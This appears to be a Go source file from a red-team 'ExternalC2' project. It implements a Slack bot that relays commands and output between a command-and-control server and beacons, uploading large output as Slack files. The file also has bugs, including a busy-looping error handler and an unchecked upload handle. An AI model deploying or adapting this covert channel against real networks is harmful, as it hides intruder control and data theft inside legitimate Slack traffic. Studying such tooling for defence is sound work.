package SlackBot

import (
	"ExternalC2/pkg/ExternalC2Go"
	"github.com/google/uuid"
	"github.com/nlopes/slack"
	"log"
)

var (
	SlackMessageMap = make(map[uuid.UUID]SlackMessage)

	ErrChan = make(chan error)

	MessageFromC2 = make(chan ExternalC2Go.EC2Message)

	// chan to ec2
	MessageToC2 = make(chan ExternalC2Go.EC2Message)

	// our slack channel to send instructions to
	// man, I really should have paid attention when we went over mutexes in class
	SlackToC2Messages     = make(chan ExternalC2Go.EC2Message)
	SlackToBeaconMessages = make(chan SlackMessage)
)

const (
	SLACK_MSG_MAX_LEN = 4000
)

type SlackMessage struct {
	Channel  string
	UID      uuid.UUID
	Contents string
	Message  *slack.Message
}

type SlackBot struct {
	Client slack.Client
	RTM    slack.RTM
}

func NewSlackBot(client slack.Client, RTM slack.RTM) *SlackBot {
	return &SlackBot{Client: client, RTM: RTM}
}

func handleErrors() {
	var last error
	peek := <-ErrChan
	for {
		if peek != last {
			log.Println(peek)
			last = peek
		}
	}
}

// listen for messages from the slack server and send them to the ec2 instance
func listen() {
	for {
		// get the top incoming message
		msg := <-SlackToC2Messages

		// pass it along to the External C2
		MessageToC2 <- msg
	}
}

func Init(sb SlackBot) {
	log.Println("[i] Starting SlackBot Message and Error Channels")
	go handleErrors()
	go listen()
	go send(sb)
}

func send(sb SlackBot) {
	for {
		top := <-SlackToBeaconMessages
		go sb.SendMessage(&top)
	}
}

func (sb SlackBot) SendMessage(m *SlackMessage) {
	if len(m.Contents) > 4000 {
		log.Println("[i] Message too large, converting to file upload")
		sb.SendFile(m)
		return
	}
	text := m.UID.String() + ":" + string(m.Contents)
	sb.RTM.NewOutgoingMessage(text, m.Channel)
}

func (sb SlackBot) SendFile(m *SlackMessage) {
	if len(m.Contents) > SLACK_MSG_MAX_LEN {
		params := slack.FileUploadParameters{
			File:    m.UID.String(),
			Content:  string(m.Contents), // changed from []byte to string
			Title:    m.UID.String(),
			Filetype: "auto",
		}
		fHadnle, err := sb.RTM.UploadFile(params)
		if err != nil {
			log.Println("[-] Got an error uploading the file")
			ErrChan <- err
		}
		log.Printf("[i] File uploaded to %s\n", fHadnle.URLPrivateDownload)
	}
}
